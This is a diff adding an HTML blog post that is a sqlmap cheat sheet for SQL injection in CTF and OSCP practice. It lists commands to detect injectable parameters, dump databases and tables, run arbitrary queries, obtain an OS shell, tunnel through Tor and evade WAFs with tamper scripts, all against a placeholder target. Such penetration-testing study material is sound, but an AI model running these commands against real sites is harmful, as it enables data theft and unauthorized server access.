@@ -1,0 +1,313 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Testing SQLi with SQLMAP | this is a tech blog</title>
+  <meta name="author" content="dmeg">
+  
+  <meta name="description" content="SQLMAP is good tool and we will have us a cheatsheet to use sqlmap in CTF and OWSP ."> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Testing SQLi with SQLMAP"/>
+  <meta property="og:site_name" content="this is a tech blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+  <!-- Matomo -->
+<script type="text/javascript">
+  var _paq = window._paq = window._paq || [];
+  /* tracker methods like "setCustomDimension" should be called before "trackPageView" */
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="https://dmegtech.matomo.cloud/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.type='text/javascript'; g.async=true; g.src='//cdn.matomo.cloud/dmegtech.matomo.cloud/matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+<!-- End Matomo Code -->
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">this is a tech blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Testing SQLi with SQLMAP</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>SQLMAP is good tool and we will have us a cheatsheet to use sqlmap in CTF and OWSP .</p>
+<a id="more"></a>
+
+<h4 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h4><p>If nothing is known about the target yet we use the normal command first to see if SQLMap finds something nice to look at.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page/”--proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span> --cookie=”SESSID=lred0jr6na1vmci;” --data=”p1=value1” -p p1 --level=5 --risk=3 --dbms=mysql --technique=BEUSTQ --force-ssl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Automatic-GET-request-parameter"><a href="#Automatic-GET-request-parameter" class="headerlink" title="Automatic GET request parameter"></a>Automatic GET request parameter</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1&amp;p2=value2”</span><br></pre></td></tr></table></figure>
+
+<h4 id="Specify-the-GET-request-parameters-to-Exploit"><a href="#Specify-the-GET-request-parameters-to-Exploit" class="headerlink" title="Specify the GET request parameters to Exploit"></a>Specify the GET request parameters to Exploit</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1&amp;p2=value2” -p p1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Use-POST-requests-Test-All-parameters"><a href="#Use-POST-requests-Test-All-parameters" class="headerlink" title="Use POST requests (Test All parameters)"></a>Use POST requests (Test All parameters)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page/” --data=<span class="string">&quot;p1=value1&amp;p2=value2&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="SQLMap-Request-file-as-input"><a href="#SQLMap-Request-file-as-input" class="headerlink" title="SQLMap Request file as input"></a>SQLMap Request file as input</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Use-Authenticated-Session-With-Cookie"><a href="#Use-Authenticated-Session-With-Cookie" class="headerlink" title="Use Authenticated Session With Cookie"></a>Use Authenticated Session With Cookie</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page/” --data=<span class="string">&quot;p1=value1&amp;p2=value2&quot;</span> --cookie=<span class="string">&quot;Session_Cookie_Value&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Use-Authenticated-Session-with-Auth-Headers"><a href="#Use-Authenticated-Session-with-Auth-Headers" class="headerlink" title="Use Authenticated Session with Auth Headers"></a>Use Authenticated Session with Auth Headers</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page/” --data=<span class="string">&quot;p1=value1&amp;p2=value2&quot;</span> --headers=<span class="string">&quot;Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Basic-Authentication"><a href="#Basic-Authentication" class="headerlink" title="Basic Authentication"></a>Basic Authentication</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page/” --data=<span class="string">&quot;p1=value1&amp;p2=value2&quot;</span> --auth-type=basic --auth-cred=username:password</span><br></pre></td></tr></table></figure>
+
+<h4 id="Use-Previously-created-Session-as-SQLmap-input-s"><a href="#Use-Previously-created-Session-as-SQLmap-input-s" class="headerlink" title="Use Previously created Session as SQLmap input (-s)"></a>Use Previously created Session as SQLmap input (-s)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1<span class="string">&quot; -s SESSION-FILE.sqlite --dbs</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Post-Exploitation-Commands"><a href="#Post-Exploitation-Commands" class="headerlink" title="Post Exploitation Commands"></a>Post Exploitation Commands</h3><h4 id="List-the-Databases"><a href="#List-the-Databases" class="headerlink" title="List the Databases"></a>List the Databases</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” --dbs</span><br></pre></td></tr></table></figure>
+
+<h4 id="List-Tables-of-Database-TARGET-DB"><a href="#List-Tables-of-Database-TARGET-DB" class="headerlink" title="List Tables of Database TARGET_DB"></a>List Tables of Database TARGET_DB</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --tables</span><br></pre></td></tr></table></figure>
+
+<h4 id="List-Columns-of-Table-TARGET-TABLE-of-Database-TARGET-DB"><a href="#List-Columns-of-Table-TARGET-TABLE-of-Database-TARGET-DB" class="headerlink" title="List Columns of Table TARGET_TABLE of Database TARGET_DB"></a>List Columns of Table TARGET_TABLE of Database TARGET_DB</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --columns</span><br></pre></td></tr></table></figure>
+
+<h4 id="Dump-Specific-Data-of-Columns-of-Table-TARGET-TABLE-of-Database-TARGET-DB"><a href="#Dump-Specific-Data-of-Columns-of-Table-TARGET-TABLE-of-Database-TARGET-DB" class="headerlink" title="Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB"></a>Dump Specific Data of Columns of Table TARGET_TABLE of Database TARGET_DB</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE -C <span class="string">&quot;Col1,Col2&quot;</span> --dump</span><br></pre></td></tr></table></figure>
+
+<h4 id="Fully-Dump-Table-TARGET-TABLE-of-Database-TARGET-DB"><a href="#Fully-Dump-Table-TARGET-TABLE-of-Database-TARGET-DB" class="headerlink" title="Fully Dump Table TARGET_TABLE of Database TARGET_DB"></a>Fully Dump Table TARGET_TABLE of Database TARGET_DB</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB -T TARGET_TABLE --dump</span><br></pre></td></tr></table></figure>
+
+<h4 id="Dump-full-Database"><a href="#Dump-full-Database" class="headerlink" title="Dump full Database"></a>Dump full Database</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” -D TARGET_DB --dump</span><br></pre></td></tr></table></figure>
+
+<h4 id="Custom-SQL-query"><a href="#Custom-SQL-query" class="headerlink" title="Custom SQL query"></a>Custom SQL query</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” --sql-query <span class="string">&quot;SELECT * FROM TARGET_DB;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Get-OS-Shell"><a href="#Get-OS-Shell" class="headerlink" title="Get OS Shell"></a>Get OS Shell</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” --os-shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLMap-Proxy"><a href="#SQLMap-Proxy" class="headerlink" title="SQLMap Proxy"></a>SQLMap Proxy</h3><h4 id="Proxy-through-Burpsuite"><a href="#Proxy-through-Burpsuite" class="headerlink" title="Proxy through Burpsuite"></a>Proxy through Burpsuite</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” --proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Use-Tor-Socks5-proxy"><a href="#Use-Tor-Socks5-proxy" class="headerlink" title="Use Tor Socks5 proxy"></a>Use Tor Socks5 proxy</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” --tor --tor-type=SOCKS5 --check-tor --dbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="Tamper-Scripts"><a href="#Tamper-Scripts" class="headerlink" title="Tamper Scripts"></a>Tamper Scripts</h3><p>You can use the tamper scripts to bypass WAF or to modify the payload. You can use multiple tampering scripts at once using –tamper flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u “https://target_site.com/page?p1=value1” --tamper=charencode</span><br></pre></td></tr></table></figure>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2022/04/24/SQLMAP/" class="leancloud-visitors view" data-flag-title="Testing SQLi with SQLMAP">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2020/12/25/Doctor/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-04-24 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/METHODOLOGY/">METHODOLOGY<span>5</span></a></li> <li><a href="/tags/OSCP/">OSCP<span>6</span></a></li> <li><a href="/tags/WEB/">WEB<span>4</span></a></li> <li><a href="/tags/EXPLOIT/">EXPLOIT<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 dmeg's Blog
+  
+        
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
